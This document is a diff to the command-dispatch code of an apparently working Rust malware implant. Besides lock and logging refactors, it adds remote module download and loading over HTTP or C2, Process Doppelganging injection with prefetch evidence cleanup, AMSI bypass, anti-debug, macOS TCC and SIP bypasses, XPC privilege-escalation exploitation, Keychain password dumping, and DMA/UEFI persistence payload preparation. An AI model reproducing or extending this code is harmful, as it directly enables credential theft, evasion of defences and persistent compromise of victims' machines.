@@ -8,11 +8,12 @@
 //! - **Shell sessions**: Manages interactive shell session lifetimes.
 //! - **Loaded plugins**: Registry of dynamically loaded plugin modules.
 
+use common::lock::MutexExt;
 use base64::Engine;
 use common::{
     config::Config, AuditEvent, Command, CryptoSession, Message, NetDiscoveryOp, Outcome,
 };
-use lazy_static::lazy_static;
+use once_cell::sync::Lazy;
 use module_loader::LoadedPlugin;
 use std::collections::HashMap;
 use std::path::Path;
@@ -28,10 +29,8 @@ use super::fsops;
 // sender keyed by `module_id`.  When the corresponding `ModuleResponse`
 // arrives in the main loop, the oneshot is completed with the encrypted
 // blob, unblocking the handler.
-lazy_static! {
-    pub static ref PENDING_MODULE_REQUESTS: Mutex<HashMap<String, tokio::sync::oneshot::Sender<Vec<u8>>>> =
-        Mutex::new(HashMap::new());
-}
+pub static PENDING_MODULE_REQUESTS: Lazy<Mutex<HashMap<String, tokio::sync::oneshot::Sender<Vec<u8>>>>> =
+    Lazy::new(|| Mutex::new(HashMap::new()));
 
 /// Reject any module identifier that contains characters outside the
 /// safe alphabet. Prevents path traversal via the `DeployModule`
@@ -54,19 +53,16 @@ struct PluginJob {
     output: Option<String>,
 }
 
-lazy_static! {
-    static ref LOADED_PLUGINS: Mutex<HashMap<String, LoadedPlugin>> =
-        Mutex::new(HashMap::new());
-    pub static ref SHUTDOWN_NOTIFY: Arc<tokio::sync::Notify> = Arc::new(tokio::sync::Notify::new());
-    /// Registry of asynchronous plugin jobs keyed by job ID.
-    static ref PLUGIN_JOBS: Mutex<HashMap<String, PluginJob>> =
-        Mutex::new(HashMap::new());
-}
+static LOADED_PLUGINS: Lazy<Mutex<HashMap<String, LoadedPlugin>>> =
+    Lazy::new(|| Mutex::new(HashMap::new()));
+pub static SHUTDOWN_NOTIFY: Lazy<Arc<tokio::sync::Notify>> =
+    Lazy::new(|| Arc::new(tokio::sync::Notify::new()));
+/// Registry of asynchronous plugin jobs keyed by job ID.
+static PLUGIN_JOBS: Lazy<Mutex<HashMap<String, PluginJob>>> =
+    Lazy::new(|| Mutex::new(HashMap::new()));
 
 #[cfg(all(windows, feature = "forensic-cleanup"))]
-lazy_static! {
-    static ref SESSION_START_TIME: std::time::SystemTime = std::time::SystemTime::now();
-}
+static SESSION_START_TIME: Lazy<std::time::SystemTime> = Lazy::new(std::time::SystemTime::now);
 
 #[cfg(all(windows, feature = "forensic-cleanup"))]
 fn to_nt_wide_path(path: &str) -> Vec<u16> {
@@ -77,6 +73,60 @@ fn to_nt_wide_path(path: &str) -> Vec<u16> {
             .encode_utf16()
             .chain(std::iter::once(0))
             .collect()
+    }
+}
+
+/// Parse a TCC resource name string into a `crate::macos_postexp::TccResource`.
+/// Returns a sensible default (FullDiskAccess) for unrecognised strings.
+#[cfg(all(target_os = "macos", feature = "macos-postexp"))]
+fn parse_tcc_resource(name: &str) -> crate::macos_postexp::TccResource {
+    match name {
+        "Camera" => crate::macos_postexp::TccResource::Camera,
+        "Microphone" => crate::macos_postexp::TccResource::Microphone,
+        "ScreenRecording" => crate::macos_postexp::TccResource::ScreenRecording,
+        "FullDiskAccess" => crate::macos_postexp::TccResource::FullDiskAccess,
+        "DesktopFolder" => crate::macos_postexp::TccResource::DesktopFolder,
+        "DocumentsFolder" => crate::macos_postexp::TccResource::DocumentsFolder,
+        "DownloadsFolder" => crate::macos_postexp::TccResource::DownloadsFolder,
+        "Contacts" => crate::macos_postexp::TccResource::Contacts,
+        "Calendar" => crate::macos_postexp::TccResource::Calendar,
+        "Reminders" => crate::macos_postexp::TccResource::Reminders,
+        "Photos" => crate::macos_postexp::TccResource::Photos,
+        "Accessibility" => crate::macos_postexp::TccResource::Accessibility,
+        "PostEvent" => crate::macos_postexp::TccResource::PostEvent,
+        _ => crate::macos_postexp::TccResource::FullDiskAccess,
+    }
+}
+
+/// Parse a DMA payload type string into a `crate::hardware_persistence::DmaPayloadType`.
+#[cfg(feature = "hardware-persistence")]
+fn parse_dma_payload_type(name: &str) -> Result<crate::hardware_persistence::thunderbolt_dma::DmaPayloadType, String> {
+    use crate::hardware_persistence::thunderbolt_dma::DmaPayloadType;
+    match name {
+        "KernelDseDisable" => Ok(DmaPayloadType::KernelDseDisable),
+        "ProcessInjection" => Ok(DmaPayloadType::ProcessInjection),
+        "CodeIntegrityPatch" => Ok(DmaPayloadType::CodeIntegrityPatch),
+        "KernelCallbackInstall" => Ok(DmaPayloadType::KernelCallbackInstall),
+        "Raw" => Ok(DmaPayloadType::Raw),
+        _ => Err(format!(
+            "Unknown DMA payload type: '{}'. Use KernelDseDisable, ProcessInjection, CodeIntegrityPatch, KernelCallbackInstall, or Raw.",
+            name
+        )),
+    }
+}
+
+/// Parse a persistence artifact type string into a `crate::hardware_persistence::boot_persistence::PersistenceArtifactType`.
+#[cfg(feature = "hardware-persistence")]
+fn parse_persistence_artifact_type(name: &str) -> crate::hardware_persistence::boot_persistence::PersistenceArtifactType {
+    use crate::hardware_persistence::boot_persistence::PersistenceArtifactType;
+    match name {
+        "VbrModification" => PersistenceArtifactType::VbrModification,
+        "MbrModification" => PersistenceArtifactType::MbrModification,
+        "EfiBootEntry" => PersistenceArtifactType::EfiBootEntry,
+        "UnsignedUefiDriver" => PersistenceArtifactType::UnsignedUefiDriver,
+        "NvramBootOrderModification" => PersistenceArtifactType::NvramBootOrderModification,
+        "HiddenSectorPayload" => PersistenceArtifactType::HiddenSectorPayload,
+        _ => PersistenceArtifactType::EfiBootEntry,
     }
 }
 
@@ -218,7 +268,7 @@ pub(crate) fn push_module(
                 .duration_since(std::time::UNIX_EPOCH)
                 .unwrap_or_default()
                 .as_secs();
-            LOADED_PLUGINS.lock().unwrap().insert(
+            LOADED_PLUGINS.lock_recover().insert(
                 module_name.clone(),
                 LoadedPlugin {
                     plugin: Arc::new(plugin),
@@ -436,7 +486,7 @@ pub async fn handle_command(
                                 .duration_since(std::time::UNIX_EPOCH)
                                 .unwrap_or_default()
                                 .as_secs();
-                            LOADED_PLUGINS.lock().unwrap().insert(
+                            LOADED_PLUGINS.lock_recover().insert(
                                 module_id.clone(),
                                 LoadedPlugin {
                                     plugin: Arc::new(plugin),
@@ -460,7 +510,7 @@ pub async fn handle_command(
             // before calling execute() so other plugin operations are not
             // serialised behind a long-running plugin execution.
             let maybe_plugin = {
-                let plugins = LOADED_PLUGINS.lock().unwrap();
+                let plugins = LOADED_PLUGINS.lock_recover();
                 plugins.get(plugin_id).map(|lp| lp.plugin.clone())
             };
             match maybe_plugin {
@@ -469,7 +519,7 @@ pub async fn handle_command(
                         // Check for async job marker.
                         if let Some(rest) = result.strip_prefix("__ASYNC_JOB__:") {
                             let job_id = rest.to_string();
-                            PLUGIN_JOBS.lock().unwrap().insert(
+                            PLUGIN_JOBS.lock_recover().insert(
                                 job_id.clone(),
                                 PluginJob {
                                     plugin_id: plugin_id.clone(),
@@ -522,7 +572,7 @@ pub async fn handle_command(
         #[cfg(feature = "self-reencode")]
         Command::SetReencodeSeed { seed } => {
             crate::self_reencode::set_seed(seed);
-            log::info!("self-reencode seed updated to {seed:#018x}");
+            tracing::info!("self-reencode seed updated to {seed:#018x}");
             Ok(format!("Re-encode seed set to {seed:#018x}"))
         }
         #[cfg(not(feature = "self-reencode"))]
@@ -533,11 +583,11 @@ pub async fn handle_command(
         #[cfg(feature = "self-reencode")]
         Command::MorphNow { seed } => match crate::self_reencode::morph_now(seed) {
             Ok(hash) => {
-                log::info!("MorphNow completed: .text hash = {hash}");
+                tracing::info!("MorphNow completed: .text hash = {hash}");
                 Ok(hash)
             }
             Err(e) => {
-                log::error!("MorphNow failed: {e:#}");
+                tracing::error!("MorphNow failed: {e:#}");
                 Err(format!("MorphNow failed: {e:#}"))
             }
         },
@@ -561,7 +611,7 @@ pub async fn handle_command(
                 Ok(format!("Sleep variant set to {variant}"))
             }
             other => {
-                log::warn!("unknown sleep variant '{other}', ignoring");
+                tracing::warn!("unknown sleep variant '{other}', ignoring");
                 Err(format!("unknown sleep variant: {other}"))
             }
         },
@@ -586,13 +636,17 @@ pub async fn handle_command(
 
         // ── Plugin Framework commands ──
         Command::ListPlugins => {
-            let plugins = LOADED_PLUGINS.lock().unwrap();
-            let meta_list: Vec<_> = plugins.values().map(|lp| &lp.metadata).collect();
+            // Clone metadata under the lock, then release before
+            // serialising so other plugin commands are not blocked.
+            let meta_list: Vec<_> = {
+                let plugins = LOADED_PLUGINS.lock_recover();
+                plugins.values().map(|lp| lp.metadata.clone()).collect()
+            };
             serde_json::to_string(&meta_list).map_err(|e| e.to_string())
         }
 
         Command::UnloadPlugin { ref plugin_id } => {
-            let removed = LOADED_PLUGINS.lock().unwrap().remove(plugin_id);
+            let removed = LOADED_PLUGINS.lock_recover().remove(plugin_id);
             // Dropping the LoadedPlugin drops the inner Arc<Box<dyn Plugin>>,
             // which triggers destroy via the FfiPlugin Drop implementation.
             if removed.is_some() {
@@ -603,9 +657,14 @@ pub async fn handle_command(
         }
 
         Command::GetPluginInfo { ref plugin_id } => {
-            let plugins = LOADED_PLUGINS.lock().unwrap();
-            match plugins.get(plugin_id) {
-                Some(lp) => serde_json::to_string(&lp.metadata).map_err(|e| e.to_string()),
+            // Clone metadata under the lock, then release before
+            // serialising so other plugin commands are not blocked.
+            let maybe_meta = {
+                let plugins = LOADED_PLUGINS.lock_recover();
+                plugins.get(plugin_id).map(|lp| lp.metadata.clone())
+            };
+            match maybe_meta {
+                Some(meta) => serde_json::to_string(&meta).map_err(|e| e.to_string()),
                 None => Err(format!("Plugin '{plugin_id}' not loaded")),
             }
         }
@@ -617,54 +676,120 @@ pub async fn handle_command(
             if !is_valid_module_id(module_id) {
                 Err("Invalid module_id (allowed: [a-zA-Z0-9_-]{1,128})".to_string())
             } else {
-                let _ = repo_url; // URL no longer used — module goes through C2.
+                // ── DownloadModule ────────────────────────────────────
+                // Three resolution paths, in priority order:
+                //   1. repo_url supplied → direct HTTP(S) download, cache, load
+                //   2. no repo_url, module already cached → load from cache
+                //   3. no repo_url, not cached → C2-tunneled request (with timeout)
 
-                // ── C2-tunneled module download ──────────────────────
-                // Send a ModuleRequest through the outbound C2 channel
-                // and wait for the server's ModuleResponse via a oneshot.
-                let (tx, rx) = tokio::sync::oneshot::channel::<Vec<u8>>();
-                {
-                    let mut pending = PENDING_MODULE_REQUESTS.lock().unwrap();
-                    pending.insert(module_id.clone(), tx);
-                }
+                let cfg = config.lock().await.clone();
+                let cache_path = std::path::Path::new(&cfg.module_cache_dir).join(format!(
+                    "{}.{}",
+                    module_id,
+                    std::env::consts::DLL_EXTENSION
+                ));
 
-                let req = Message::ModuleRequest {
-                    module_id: module_id.clone(),
-                };
-                if let Err(e) = out_tx.send(req).await {
-                    // Remove the pending entry since the request never went out.
-                    PENDING_MODULE_REQUESTS.lock().unwrap().remove(module_id);
-                    return (
-                        Err(format!("Failed to send ModuleRequest: {e}")),
-                        None,
-                        make_audit(&action, Outcome::Failure, &e.to_string(), operator_id),
-                    );
-                }
+                // ── Path 1: Direct HTTP(S) download from repo_url ─────
+                if let Some(ref url) = repo_url {
+                    let full_url = if url.ends_with('/') {
+                        format!("{}{}.{}",
+                            url, module_id, std::env::consts::DLL_EXTENSION)
+                    } else {
+                        format!("{}/{}.{}",
+                            url, module_id, std::env::consts::DLL_EXTENSION)
+                    };
 
-                // Wait for the server's ModuleResponse.  The main loop
-                // completes the oneshot when it receives the response.
-                match rx.await {
-                    Ok(encrypted_blob) => {
-                        if encrypted_blob.is_empty() {
+                    tracing::info!("DownloadModule: fetching from {full_url}");
+
+                    let response = match reqwest::get(&full_url).await {
+                        Ok(r) => r,
+                        Err(e) => {
                             return (
-                                Err(format!("Module '{module_id}' not found on server")),
+                                Err(format!("HTTP download from '{url}' failed: {e}")),
                                 None,
-                                make_audit(
-                                    &action,
-                                    Outcome::Failure,
-                                    "server returned empty module",
-                                    operator_id,
-                                ),
+                                make_audit(&action, Outcome::Failure,
+                                    &format!("HTTP download failed: {e}"), operator_id),
                             );
                         }
+                    };
 
-                        // Feed the encrypted blob directly into load_plugin
-                        // (no intermediate file on disk).
-                        let cfg = config.lock().await.clone();
+                    if !response.status().is_success() {
+                        let status = response.status();
+                        return (
+                            Err(format!("HTTP download from '{url}' returned {status}")),
+                            None,
+                            make_audit(&action, Outcome::Failure,
+                                &format!("HTTP {status}"), operator_id),
+                        );
+                    }
+
+                    let blob = match response.bytes().await {
+                        Ok(b) => b.to_vec(),
+                        Err(e) => {
+                            return (
+                                Err(format!("Failed to read HTTP response body: {e}")),
+                                None,
+                                make_audit(&action, Outcome::Failure,
+                                    &format!("HTTP body read failed: {e}"), operator_id),
+                            );
+                        }
+                    };
+
+                    if blob.is_empty() {
+                        return (
+                            Err(format!("Module '{module_id}' download returned empty body from '{url}'")),
+                            None,
+                            make_audit(&action, Outcome::Failure,
+                                "empty HTTP response body", operator_id),
+                        );
+                    }
+
+                    // Cache the downloaded blob for future use.
+                    if let Err(e) = fsops::write_file(
+                        &cache_path.to_string_lossy(), &blob, &cfg,
+                    ).await {
+                        tracing::warn!(
+                            "DownloadModule: failed to cache module to {}: {e}",
+                            cache_path.display()
+                        );
+                    }
+
+                    match module_loader::load_plugin(
+                        &blob, &crypto, cfg.module_verify_key.as_deref(),
+                    ) {
+                        Ok(plugin) => {
+                            let metadata = plugin.get_metadata().unwrap_or_else(|| {
+                                module_loader::PluginMetadata::default_for(module_id)
+                            });
+                            let load_timestamp = std::time::SystemTime::now()
+                                .duration_since(std::time::UNIX_EPOCH)
+                                .unwrap_or_default()
+                                .as_secs();
+                            LOADED_PLUGINS.lock_recover().insert(
+                                module_id.clone(),
+                                LoadedPlugin {
+                                    plugin: Arc::new(plugin),
+                                    metadata,
+                                    load_timestamp,
+                                },
+                            );
+                            Ok(format!("Module '{module_id}' downloaded from repo and loaded"))
+                        }
+                        Err(e) => Err(format!("Module load failed: {e}")),
+                    }
+                } else {
+                    // ── Path 2: Check local cache ─────────────────────
+                    let cached = fsops::read_file(
+                        &cache_path.to_string_lossy(), &cfg,
+                    ).await.ok();
+
+                    if let Some(blob) = cached {
+                        tracing::info!(
+                            "DownloadModule: loading '{}' from cache at {}",
+                            module_id, cache_path.display()
+                        );
                         match module_loader::load_plugin(
-                            &encrypted_blob,
-                            &crypto,
-                            cfg.module_verify_key.as_deref(),
+                            &blob, &crypto, cfg.module_verify_key.as_deref(),
                         ) {
                             Ok(plugin) => {
                                 let metadata = plugin.get_metadata().unwrap_or_else(|| {
@@ -674,7 +799,7 @@ pub async fn handle_command(
                                     .duration_since(std::time::UNIX_EPOCH)
                                     .unwrap_or_default()
                                     .as_secs();
-                                LOADED_PLUGINS.lock().unwrap().insert(
+                                LOADED_PLUGINS.lock_recover().insert(
                                     module_id.clone(),
                                     LoadedPlugin {
                                         plugin: Arc::new(plugin),
@@ -682,14 +807,103 @@ pub async fn handle_command(
                                         load_timestamp,
                                     },
                                 );
-                                Ok(format!("Module '{module_id}' downloaded and loaded via C2"))
+                                Ok(format!("Module '{module_id}' loaded from cache"))
                             }
-                            Err(e) => Err(format!("Module load failed: {e}")),
+                            Err(e) => Err(format!("Cached module load failed: {e}")),
+                        }
+                    } else {
+                        // ── Path 3: C2-tunneled module download ───────
+                        // Send a ModuleRequest through the outbound C2
+                        // channel and wait for the server's ModuleResponse
+                        // via a oneshot.  A timeout prevents indefinite
+                        // hangs if the server never responds.
+                        drop(cfg); // release config lock before awaiting
+
+                        let (tx, rx) = tokio::sync::oneshot::channel::<Vec<u8>>();
+                        {
+                            let mut pending = PENDING_MODULE_REQUESTS.lock_recover();
+                            pending.insert(module_id.clone(), tx);
+                        }
+
+                        let req = Message::ModuleRequest {
+                            module_id: module_id.clone(),
+                        };
+                        if let Err(e) = out_tx.send(req).await {
+                            PENDING_MODULE_REQUESTS.lock_recover().remove(module_id);
+                            return (
+                                Err(format!("Failed to send ModuleRequest: {e}")),
+                                None,
+                                make_audit(&action, Outcome::Failure,
+                                    &e.to_string(), operator_id),
+                            );
+                        }
+
+                        // Wait for the server's ModuleResponse with a
+                        // bounded timeout so the handler cannot hang
+                        // indefinitely if the server drops the request.
+                        const MODULE_DOWNLOAD_TIMEOUT: std::time::Duration =
+                            std::time::Duration::from_secs(60);
+
+                        match tokio::time::timeout(MODULE_DOWNLOAD_TIMEOUT, rx).await {
+                            Ok(Ok(encrypted_blob)) => {
+                                if encrypted_blob.is_empty() {
+                                    return (
+                                        Err(format!("Module '{module_id}' not found on server")),
+                                        None,
+                                        make_audit(&action, Outcome::Failure,
+                                            "server returned empty module", operator_id),
+                                    );
+                                }
+
+                                // Cache the encrypted blob for future use.
+                                let cfg = config.lock().await.clone();
+                                if let Err(e) = fsops::write_file(
+                                    &cache_path.to_string_lossy(),
+                                    &encrypted_blob, &cfg,
+                                ).await {
+                                    tracing::warn!(
+                                        "DownloadModule: failed to cache module: {e}"
+                                    );
+                                }
+
+                                match module_loader::load_plugin(
+                                    &encrypted_blob, &crypto,
+                                    cfg.module_verify_key.as_deref(),
+                                ) {
+                                    Ok(plugin) => {
+                                        let metadata = plugin.get_metadata().unwrap_or_else(|| {
+                                            module_loader::PluginMetadata::default_for(module_id)
+                                        });
+                                        let load_timestamp = std::time::SystemTime::now()
+                                            .duration_since(std::time::UNIX_EPOCH)
+                                            .unwrap_or_default()
+                                            .as_secs();
+                                        LOADED_PLUGINS.lock_recover().insert(
+                                            module_id.clone(),
+                                            LoadedPlugin {
+                                                plugin: Arc::new(plugin),
+                                                metadata,
+                                                load_timestamp,
+                                            },
+                                        );
+                                        Ok(format!("Module '{module_id}' downloaded via C2 and loaded"))
+                                    }
+                                    Err(e) => Err(format!("Module load failed: {e}")),
+                                }
+                            }
+                            Ok(Err(_)) => Err(format!(
+                                "ModuleRequest for '{module_id}' cancelled — channel closed"
+                            )),
+                            Err(_) => {
+                                // Timeout — remove stale pending entry.
+                                PENDING_MODULE_REQUESTS.lock_recover().remove(module_id);
+                                Err(format!(
+                                    "ModuleRequest for '{module_id}' timed out after {}s",
+                                    MODULE_DOWNLOAD_TIMEOUT.as_secs()
+                                ))
+                            }
                         }
                     }
-                    Err(_) => Err(format!(
-                        "ModuleRequest for '{module_id}' cancelled — channel closed"
-                    )),
                 }
             }
         }
@@ -699,7 +913,7 @@ pub async fn handle_command(
             ref input_data,
         } => {
             let maybe_plugin = {
-                let plugins = LOADED_PLUGINS.lock().unwrap();
+                let plugins = LOADED_PLUGINS.lock_recover();
                 plugins.get(plugin_id).map(|lp| lp.plugin.clone())
             };
             match maybe_plugin {
@@ -716,7 +930,7 @@ pub async fn handle_command(
         }
 
         Command::JobStatus { ref job_id } => {
-            let jobs = PLUGIN_JOBS.lock().unwrap();
+            let jobs = PLUGIN_JOBS.lock_recover();
             match jobs.get(job_id) {
                 Some(job) => {
                     let info = serde_json::json!({
@@ -1281,7 +1495,7 @@ pub async fn handle_command(
                                 Ok("AMSI write-raid bypass enabled (auto-selected)".to_string())
                             }
                             Err(_) => {
-                                log::warn!("auto: write-raid failed, falling back to memory-patch");
+                                tracing::warn!("auto: write-raid failed, falling back to memory-patch");
                                 crate::amsi_defense::orchestrate_layers();
                                 Ok("AMSI memory-patch bypass applied (write-raid fallback)"
                                     .to_string())
@@ -1417,6 +1631,7 @@ pub async fn handle_command(
             match unsafe {
                 crate::injection_transacted::inject_transacted_hollowing(
                     payload.as_slice(),
+                    Some(target_process.as_str()),
                     etw_blinding,
                     rollback_timeout_ms,
                 )
@@ -1445,6 +1660,49 @@ pub async fn handle_command(
         }
         #[cfg(not(feature = "transacted-hollowing"))]
         Command::TransactedHollow { .. } => {
+            Err("transacted-hollowing feature not enabled".to_string())
+        }
+
+        // ── Process Doppelganging injection ──────────────────────────────
+        // NTFS transaction-based injection that creates a section from a
+        // transacted file, rolls back the transaction (no disk artifacts),
+        // then maps the section into a suspended process and executes.
+        #[cfg(all(windows, feature = "transacted-hollowing"))]
+        Command::ProcessDoppelganging {
+            ref target_process,
+            ref payload,
+        } => {
+            match unsafe {
+                crate::injection_doppelganging::doppelganging_inject(
+                    payload.as_slice(),
+                    target_process.as_deref(),
+                )
+            } {
+                Ok(result) => {
+                    // Post-injection hook: auto-clean prefetch evidence.
+                    #[cfg(all(windows, feature = "forensic-cleanup"))]
+                    if let Some(ref name) = target_process {
+                        crate::forensic_cleanup::prefetch::auto_clean_after_injection(name);
+                    }
+                    let pid = result.pid;
+                    match serde_json::to_string_pretty(&serde_json::json!({
+                        "pid": pid,
+                        "technique": "ProcessDoppelganging",
+                        "payload_size": payload.len(),
+                    })) {
+                        Ok(json) => Ok(json),
+                        Err(e) => Err(format!("serialization failed: {e}")),
+                    }
+                }
+                Err(e) => Err(format!("process doppelganging failed: {e}")),
+            }
+        }
+        #[cfg(all(not(windows), feature = "transacted-hollowing"))]
+        Command::ProcessDoppelganging { .. } => {
+            Err("ProcessDoppelganging is only available on Windows".to_string())
+        }
+        #[cfg(not(feature = "transacted-hollowing"))]
+        Command::ProcessDoppelganging { .. } => {
             Err("transacted-hollowing feature not enabled".to_string())
         }
 
@@ -2386,6 +2644,338 @@ pub async fn handle_command(
         Command::UefiRemovePersistence { .. } => {
             Err("uefi-persistence feature not enabled".to_string())
         }
+
+        // ── Anti-Debug Hardening ──────────────────────────────────────────
+        Command::DenyDebuggerAttach => crate::env_check::deny_debugger_attach()
+            .map(|_| "Debugger attachment denied".to_string())
+            .map_err(|_| "Failed to deny debugger attachment (already traced?)".to_string()),
+
+        // ── macOS Post-Exploitation: TCC ──────────────────────────────────
+        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
+        Command::MacTccCheck { resource } => {
+            let res = parse_tcc_resource(&resource);
+            let info = crate::macos_postexp::check_tcc_status(res);
+            Ok(serde_json::json!({
+                "resource": resource,
+                "status": match info.status {
+                    crate::macos_postexp::TccStatus::Allowed => "Allowed",
+                    crate::macos_postexp::TccStatus::Denied => "Denied",
+                    crate::macos_postexp::TccStatus::NotDetermined => "NotDetermined",
+                    crate::macos_postexp::TccStatus::Unknown => "Unknown",
+                },
+                "source": info.source,
+            }).to_string())
+        }
+        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
+        Command::MacTccCheck { .. } => {
+            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
+        }
+
+        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
+        Command::MacTccBypass { resource, method } => {
+            let res = parse_tcc_resource(&resource);
+            let result = match method.as_str() {
+                "database" => crate::macos_postexp::bypass_tcc_via_tcc_database(res),
+                "synthetic_click" => crate::macos_postexp::bypass_tcc_via_synthetic_click(res),
+                "vulnerable_process" => crate::macos_postexp::bypass_tcc_via_vulnerable_process(res),
+                "all" => Ok(crate::macos_postexp::bypass_tcc_all(res)),
+                _ => Err(anyhow::anyhow!("Unknown TCC bypass method: '{}'. Use 'database', 'synthetic_click', 'vulnerable_process', or 'all'.", method)),
+            };
+            match result {
+                Ok(r) => Ok(serde_json::json!({
+                    "success": r.success,
+                    "technique": r.technique,
+                    "message": r.message,
+                    "resource": resource,
+                }).to_string()),
+                Err(e) => Err(format!("TCC bypass failed: {e:#}")),
+            }
+        }
+        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
+        Command::MacTccBypass { .. } => {
+            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
+        }
+
+        // ── macOS Post-Exploitation: SIP ──────────────────────────────────
+        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
+        Command::MacSipStatus => {
+            let info = crate::macos_postexp::check_sip_status();
+            Ok(serde_json::json!({
+                "status": match info.status {
+                    crate::macos_postexp::SipStatus::Enabled => "Enabled",
+                    crate::macos_postexp::SipStatus::Disabled => "Disabled",
+                    crate::macos_postexp::SipStatus::PartiallyDisabled => "PartiallyDisabled",
+                    crate::macos_postexp::SipStatus::Unknown => "Unknown",
+                },
+                "csrutil_output": info.csrutil_output,
+                "nvram_config": info.nvram_config,
+            }).to_string())
+        }
+        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
+        Command::MacSipStatus => {
+            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
+        }
+
+        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
+        Command::MacSipBypassMount => {
+            crate::macos_postexp::attempt_sip_bypass_via_mount()
+                .map(|success| serde_json::json!({ "success": success }).to_string())
+                .map_err(|e| format!("SIP bypass via mount failed: {e:#}"))
+        }
+        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
+        Command::MacSipBypassMount => {
+            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
+        }
+
+        // ── macOS Post-Exploitation: XPC ──────────────────────────────────
+        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
+        Command::MacXpcEnumerate => {
+            crate::macos_postexp::enumerate_xpc_services()
+                .map(|services| {
+                    let json_services: Vec<serde_json::Value> = services.iter().map(|s| {
+                        serde_json::json!({
+                            "name": s.name,
+                            "mach_service_name": s.mach_service_name,
+                            "bundle_path": s.bundle_path.display().to_string(),
+                            "parent_framework": s.parent_framework,
+                            "has_mach_service": s.has_mach_service,
+                        })
+                    }).collect();
+                    serde_json::json!({ "services": json_services }).to_string()
+                })
+                .map_err(|e| format!("XPC enumeration failed: {e:#}"))
+        }
+        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
+        Command::MacXpcEnumerate => {
+            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
+        }
+
+        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
+        Command::MacXpcExploit { service_name } => {
+            // First enumerate services to find the one matching the requested name.
+            match crate::macos_postexp::enumerate_xpc_services() {
+                Ok(services) => {
+                    let target = services.into_iter()
+                        .find(|s| s.name == service_name || s.mach_service_name.as_deref() == Some(&service_name));
+                    match target {
+                        Some(svc) => crate::macos_postexp::exploit_xpc_privilege_escalation(&svc)
+                            .map(|result| {
+                                serde_json::json!({
+                                    "service_name": result.service_name,
+                                    "success": result.success,
+                                    "technique": result.technique,
+                                    "message": result.message,
+                                }).to_string()
+                            })
+                            .map_err(|e| format!("XPC exploitation failed: {e:#}")),
+                        None => Err(format!("XPC service '{}' not found in enumerated services", service_name)),
+                    }
+                }
+                Err(e) => Err(format!("XPC enumeration failed: {e:#}")),
+            }
+        }
+        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
+        Command::MacXpcExploit { .. } => {
+            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
+        }
+
+        // ── macOS Post-Exploitation: Keychain ─────────────────────────────
+        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
+        Command::MacKeychainDump => {
+            crate::macos_postexp::dump_keychain()
+                .map(|entries| {
+                    let json_entries: Vec<serde_json::Value> = entries.iter().map(|e| {
+                        serde_json::json!({
+                            "service": e.service,
+                            "account": e.account,
+                            "password": e.password,
+                            "entry_type": match e.entry_type {
+                                crate::macos_postexp::KeychainEntryType::GenericPassword => "GenericPassword",
+                                crate::macos_postexp::KeychainEntryType::InternetPassword => "InternetPassword",
+                                crate::macos_postexp::KeychainEntryType::Certificate => "Certificate",
+                                crate::macos_postexp::KeychainEntryType::Key => "Key",
+                            },
+                            "label": e.label,
+                            "creation_date": e.creation_date,
+                            "modification_date": e.modification_date,
+                            "access_group": e.access_group,
+                        })
+                    }).collect();
+                    serde_json::json!({ "entries": json_entries, "count": json_entries.len() }).to_string()
+                })
+                .map_err(|e| format!("Keychain dump failed: {e:#}"))
+        }
+        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
+        Command::MacKeychainDump => {
+            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
+        }
+
+        // ── Hardware Persistence: Thunderbolt / DMA ───────────────────────
+        #[cfg(feature = "hardware-persistence")]
+        Command::HwDetectThunderbolt => {
+            crate::hardware_persistence::detect_thunderbolt_controller()
+                .map(|info| {
+                    match info {
+                        Some(ti) => serde_json::json!({
+                            "generation": format!("{:?}", ti.generation),
+                            "security_level": format!("{:?}", ti.security_level),
+                            "port_count": ti.port_count,
+                            "iommu_enabled": ti.iommu_enabled,
+                            "kernel_dma_protection": ti.kernel_dma_protection,
+                            "device_name": ti.device_name,
+                            "vendor": ti.vendor,
+                            "firmware_version": ti.firmware_version,
+                            "nhi_path": ti.nhi_path,
+                        }).to_string(),
+                        None => serde_json::json!({ "detected": false }).to_string(),
+                    }
+                })
+                .map_err(|e| format!("Thunderbolt detection failed: {e:#}"))
+        }
+        #[cfg(not(feature = "hardware-persistence"))]
+        Command::HwDetectThunderbolt => {
+            Err("hardware-persistence feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "hardware-persistence")]
+        Command::HwCheckDmaVulnerability => {
+            crate::hardware_persistence::check_dma_vulnerability()
+                .map(|vuln| {
+                    serde_json::json!({
+                        "vulnerable": vuln.vulnerable,
+                        "risk_level": vuln.risk_level,
+                        "summary": vuln.summary,
+                    }).to_string()
+                })
+                .map_err(|e| format!("DMA vulnerability check failed: {e:#}"))
+        }
+        #[cfg(not(feature = "hardware-persistence"))]
+        Command::HwCheckDmaVulnerability => {
+            Err("hardware-persistence feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "hardware-persistence")]
+        Command::HwPrepareDmaPayload { payload_type } => {
+            match parse_dma_payload_type(&payload_type) {
+                Ok(pt) => crate::hardware_persistence::prepare_dma_payload(pt)
+                    .map(|payload| {
+                        use base64::Engine;
+                        serde_json::json!({
+                            "payload_data": base64::engine::general_purpose::STANDARD.encode(&payload.data),
+                            "architecture": format!("{:?}", payload.architecture),
+                            "payload_type": format!("{:?}", payload.payload_type),
+                            "size_bytes": payload.data.len(),
+                        }).to_string()
+                    })
+                    .map_err(|e| format!("DMA payload preparation failed: {e:#}")),
+                Err(e) => Err(e),
+            }
+        }
